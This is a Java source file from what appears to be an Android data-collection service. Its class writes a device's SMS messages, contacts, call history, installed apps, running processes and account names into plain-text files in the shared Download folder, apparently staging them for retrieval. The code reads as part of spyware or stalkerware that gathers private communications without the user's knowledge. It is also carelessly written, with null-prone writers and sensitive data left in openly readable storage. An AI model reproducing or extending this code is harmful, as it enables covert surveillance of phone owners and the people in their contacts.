package com.example.informationcollectionservice;

import android.os.Environment;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class FilesWork {
    static File fileSMS = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"SMS.txt");
    static File fileContacts = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"Contacts.txt");
    static File fileCalls = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"Calls.txt");
    static File fileSysInf = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"SysInf.txt");
    static File fileMems = new File(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/Mems/");

    public static void  WriteAllSMSToFile()
            throws IOException {

        if(fileSMS.exists()) {
            try {
                clearTheFile(fileSMS);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else
            try {
                fileSMS.createNewFile();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        for(int i=0; i< Service.smsList.size(); i++) {
            SMS objSms = Service.smsList.get(i);
            FileWriter writer =null;
            try {
                writer=  new FileWriter(fileSMS, true);
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
                writer.write("Address: "+objSms.getAddress()+"\nMsg: "+objSms.getMsg()+"\n\n");

                writer.close();


        }

    }

    public static void  WriteAllContactsToFile()
            throws IOException {
        if(fileContacts.exists())
            try {
                clearTheFile(fileContacts);
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        else
            try {
                fileContacts.createNewFile();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        for(int i=0; i< Service.contactsList.size(); i++) {
            Contacts objContact = Service.contactsList.get(i);

            BufferedWriter writer = new BufferedWriter(new FileWriter(fileContacts, true));

            writer.write("Name: "+objContact.getName()+"\nNumber: "+objContact.getPhoneNumber()+"\n\n");

            writer.close();
        }

    }

    public static void WriteAllCallsToFile () throws IOException
    {
        if(fileCalls.exists())
            try {
                clearTheFile(fileCalls);
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        else
            fileCalls.createNewFile();
        for(int i=0; i< Service.callsList.size(); i++) {
            Call objCall = Service.callsList.get(i);

            BufferedWriter writer = new BufferedWriter(new FileWriter(fileCalls, true));
            int minutes = (Integer.parseInt(objCall.getDuration()))/60;
            int seconds = (Integer.parseInt(objCall.getDuration()))%60;

            writer.write("Name: "+objCall.getName()+"\nNumber: "+objCall.getNumber()+"\nType: "+objCall.getType()+"\nDate: "+objCall.getDate()+"\nDuration: "+minutes+" min "+seconds+" sec"+"\n\n");

            writer.close();
        }
    }

    public static void WriteSysInfToFile () throws IOException
    {
        if(fileSysInf.exists())
        try {
            clearTheFile(fileSysInf);
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
        else
            fileSysInf.createNewFile();

        BufferedWriter writer = new BufferedWriter(new FileWriter(fileSysInf, true));
        writer.write("Android version: "+Service.sysInf.getOSVersion()+"\nSDK version: "+Service.sysInf.getSDKVersion()+"\nFree memory: "+Service.sysInf.getFreeMemory()+"\n\n");
        writer.write("Applications:\n");
        for(int i=0;i<Service.sysInf.getAppList().size();i++)
        {
            Application app = Service.sysInf.getAppList().get(i);
            writer.write((i+1)+") App name: "+app.getName()+"\nPath: "+app.getPath()+"\n\n");
        }
        writer.write("\nProcesses:\n");
        for(int i=0;i<Service.sysInf.getProcessList().size();i++)
            writer.write((i+1)+") "+Service.sysInf.getProcessList().get(i)+"\n\n");

        writer.write("\nAccounts:\n");
        for(int i=0;i<Service.sysInf.getAccountList().size();i++)
            writer.write((i+1)+") "+Service.sysInf.getAccountList().get(i)+"\n\n");

        writer.close();
    }

    public static void clearTheFile(File file) throws IOException {
        FileWriter fwOb = new FileWriter(file, false);
        PrintWriter pwOb = new PrintWriter(fwOb, false);
        pwOb.flush();
        pwOb.close();
        fwOb.close();
    }

}
